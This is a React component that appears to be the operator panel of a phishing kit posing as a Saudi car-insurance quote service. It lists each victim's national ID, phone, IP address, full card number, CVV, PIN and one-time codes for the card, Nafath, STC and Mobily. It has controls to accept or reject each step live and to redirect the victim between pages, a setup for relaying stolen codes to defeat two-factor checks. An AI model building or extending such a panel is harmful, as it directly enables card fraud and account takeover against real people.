import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Ban, Check, Eye, EyeOff, Send, X } from "lucide-react";
import {
  formatSar,
  maskCard,
  maskNationalId,
  maskPhone,
  pageLabel,
  REDIRECT_TARGETS,
  STEP_ACTIONS,
  type PageKey,
  type QuoteSession,
  type StepAction,
} from "@/lib/admin-data";

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="grid grid-cols-[10rem_1fr] items-baseline gap-4 py-2">
      <dt className="text-xs uppercase tracking-wider text-muted-foreground">{label}</dt>
      <dd className="text-sm font-medium text-foreground">{children ?? <span className="text-muted-foreground">—</span>}</dd>
    </div>
  );
}

function SectionTitle({ children }: { children: React.ReactNode }) {
  return <h3 className="mb-2 text-lg font-semibold text-foreground">{children}</h3>;
}

export function SessionModal({
  session,
  open,
  onOpenChange,
  onStepDecision,
  onRedirect,
  onBlock,
}: {
  session: QuoteSession | null;
  open: boolean;
  onOpenChange: (v: boolean) => void;
  onStepDecision: (id: string, action: StepAction, decision: "accept" | "reject") => void;
  onRedirect: (id: string, target: PageKey) => void;
  onBlock: (id: string) => void;
}) {
  const [reveal, setReveal] = useState(false);
  if (!session) return null;
  const s = session.submission;

  return (
    <Dialog
      open={open}
      onOpenChange={(v) => {
        setReveal(false);
        onOpenChange(v);
      }}
    >
      <DialogContent dir="ltr" className="max-h-[92vh] gap-6 overflow-y-auto sm:max-w-4xl">
        <DialogHeader>
          <DialogTitle className="flex flex-wrap items-baseline gap-3 text-xl">
            Session
            <code className="rounded bg-muted px-2 py-0.5 font-mono text-sm text-muted-foreground">
              {session.sessionId}
            </code>
          </DialogTitle>
          <DialogDescription>
            Review submission data, accept or decline the current step, redirect the customer, or
            block the session.
          </DialogDescription>
        </DialogHeader>

        <div className="flex justify-end">
          <Button variant="outline" size="sm" onClick={() => setReveal((r) => !r)}>
            {reveal ? <EyeOff className="size-4" /> : <Eye className="size-4" />}
            {reveal ? "Mask identifiers" : "Reveal identifiers"}
          </Button>
        </div>

        <div className="grid gap-8 md:grid-cols-2">
          <div>
            <SectionTitle>Customer</SectionTitle>
            <dl className="divide-y divide-border">
              <Row label="National ID">
                {reveal ? session.nationalId : maskNationalId(session.nationalId)}
              </Row>
              <Row label="Phone">{reveal ? session.phone : maskPhone(session.phone)}</Row>
              <Row label="Serial number">{session.serialNumber}</Row>
              <Row label="Vehicle">
                {session.modelYear} {session.vehicleMake} {session.vehicleModel}
              </Row>
              <Row label="Declared value">{formatSar(session.declaredValue)}</Row>
              <Row label="Insurer offer">
                {session.insurerCompany} · {formatSar(session.insurerOfferSar)}
              </Row>
              <Row label="Current page">{pageLabel(session.currentPage)}</Row>
              <Row label="IP address">
                <span className="font-mono">{session.ipAddress ?? "—"}</span>
              </Row>
              <Row label="Country">{session.country ?? "—"}</Row>
            </dl>
          </div>

          <div>
            <SectionTitle>Submissions</SectionTitle>
            <dl className="divide-y divide-border">
              <Row label="Card number">{reveal ? s.cardNumber : maskCard(s.cardNumber)}</Row>
              <Row label="CVV">{reveal ? s.cvv : s.cvv ? "•••" : null}</Row>
              <Row label="Expiry">{s.expiry}</Row>
              <Row label="Card OTP">{s.cardOtp}</Row>
              <Row label="PIN">{reveal ? s.pin : s.pin ? "••••" : null}</Row>
              <Row label="Motsl phone">
                {s.motslPhone ? (reveal ? s.motslPhone : maskPhone(s.motslPhone)) : null}
              </Row>
              <Row label="Motsl OTP">{s.motslOtp}</Row>
              <Row label="Nafath OTP">{s.nafathOtp}</Row>
              <Row label="STC OTP">{s.stcOtp}</Row>
              <Row label="Mobily OTP">{s.mobilyOtp}</Row>
            </dl>
          </div>
        </div>

        <div>
          <SectionTitle>Step actions</SectionTitle>
          <div className="grid gap-2 sm:grid-cols-2 lg:grid-cols-3">
            {STEP_ACTIONS.map((step) => (
              <div
                key={step}
                className="flex items-center justify-between gap-3 rounded-xl border border-border bg-card px-3 py-2"
              >
                <span className="truncate text-sm font-medium">{step}</span>
                <div className="flex items-center gap-1.5">
                  <button
                    onClick={() => onStepDecision(session.sessionId, step, "accept")}
                    className="flex size-8 items-center justify-center rounded-lg border border-success/30 text-success transition-colors hover:bg-success/10"
                    aria-label={`Accept ${step}`}
                  >
                    <Check className="size-4" />
                  </button>
                  <button
                    onClick={() => onStepDecision(session.sessionId, step, "reject")}
                    className="flex size-8 items-center justify-center rounded-lg border border-destructive/30 text-destructive transition-colors hover:bg-destructive/10"
                    aria-label={`Reject ${step}`}
                  >
                    <X className="size-4" />
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div>
          <SectionTitle>Redirect customer</SectionTitle>
          <div className="flex flex-wrap gap-2">
            {REDIRECT_TARGETS.map((t) => (
              <button
                key={t.key}
                onClick={() => onRedirect(session.sessionId, t.key)}
                className="inline-flex items-center gap-2 rounded-xl border border-border bg-card px-3 py-2 text-sm font-medium transition-colors hover:bg-muted"
              >
                <Send className="size-4 text-muted-foreground" />
                {t.label}
              </button>
            ))}
          </div>
        </div>

        <div className="flex justify-end border-t border-border pt-4">
          <Button
            variant="destructive"
            onClick={() => onBlock(session.sessionId)}
            className="gap-2"
          >
            <Ban className="size-4" />
            Block session
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
}
